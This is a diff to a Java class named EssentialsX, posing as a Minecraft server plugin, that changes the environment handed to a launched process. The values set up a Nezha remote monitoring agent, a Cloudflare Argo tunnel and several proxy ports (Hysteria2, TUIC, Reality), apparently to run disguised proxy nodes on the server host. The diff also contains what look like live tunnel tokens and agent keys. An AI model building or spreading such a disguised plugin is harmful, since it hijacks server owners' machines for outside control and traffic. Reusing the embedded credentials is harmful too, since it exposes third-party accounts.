@@ -73,26 +73,26 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "c5d5cbf5-8e78-43b6-9882-3e0cbe4c532a");
+        env.put("UUID", "a7c8bee2-5e5f-4143-8704-fe1336cbbedb");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "sui.uuz.us.kg");
-        env.put("NEZHA_PORT", "443");
-        env.put("NEZHA_KEY", "4QCftiWWfCzF4kh4qG");
-        env.put("ARGO_PORT", "11826");
-        env.put("ARGO_DOMAIN", "mcsg.uuz.us.kg");
-        env.put("ARGO_AUTH", "eyJhIjoiNTQzZDRkZTQzYjBkMjFhY2I0OTgyMmJkZGI1NzdkOTQiLCJ0IjoiNTZmMDIzM2EtYTQ5Mi00YTMxLWE4ZDItZjA0NmFhYjcxOGRlIiwicyI6Ik9ETmtaR016T1RZdE5Ea3pPUzAwWmpnMkxXSmxZMll0TlRRMlpEZG1ZVEZtWmpFeCJ9");
+        env.put("NEZHA_SERVER", "sui.uuz.us.kg:443");
+        env.put("NEZHA_PORT", "");
+        env.put("NEZHA_KEY", "T5tS7ogr7RdD4IuIW93BL8wHs5d1PB5N");
+        env.put("ARGO_PORT", "8080");
+        env.put("ARGO_DOMAIN", "hiden.blue.xx.kg");
+        env.put("ARGO_AUTH", "eyJhIjoiNTQzZDRkZTQzYjBkMjFhY2I0OTgyMmJkZGI1NzdkOTQiLCJ0IjoiNzJlNjYxZTMtYmE0MS00NjQzLTk3MmYtNDJjYzk2OWM0ZDk5IiwicyI6Ik1UVTVNbU13T1dJdE1HTm1OeTAwTlRFM0xXSTRaalV0T1dZMFlUQTNPV1F4WWprMyJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "11826");
-        env.put("TUIC_PORT", "11826");
+        env.put("HY2_PORT", "24637");
+        env.put("TUIC_PORT", "25453");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "11826");
+        env.put("REALITY_PORT", "24637");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "");
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
-        env.put("NAME", "MCsg");
+        env.put("NAME", "Hiden");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
